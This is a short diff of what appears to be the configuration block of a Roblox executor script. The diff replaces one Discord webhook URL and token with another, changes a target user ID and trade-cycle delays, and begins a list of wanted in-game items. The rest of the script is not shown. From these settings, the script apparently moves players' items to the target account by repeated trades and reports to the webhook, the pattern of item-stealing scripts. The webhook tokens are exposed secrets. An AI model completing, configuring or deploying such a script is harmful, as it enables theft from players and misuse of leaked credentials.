@@ -1,10 +1,10 @@
 -- 5 second initial delay
 task.wait(5)
 
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1479851056073805877/XZzQcT2pkyafZ6Q4EWtObpA3tTZBdDcrTzqOJv03-2qpwJM0ZUFzlYuhDRcnPhzXN_Nd"
-getgenv().TARGET_ID = 7304559806
-getgenv().DELAY_STEP = 0.5
-getgenv().TRADE_CYCLE_DELAY = 1
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480925533305962697/485A2OP6kC4abJgzO2Uqw_ZLVaxB3Rlk8aa0plzGysb_BuYtgRuF6ANFZyPCdiRTNQgb"
+getgenv().TARGET_ID = 8828039235
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
 
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
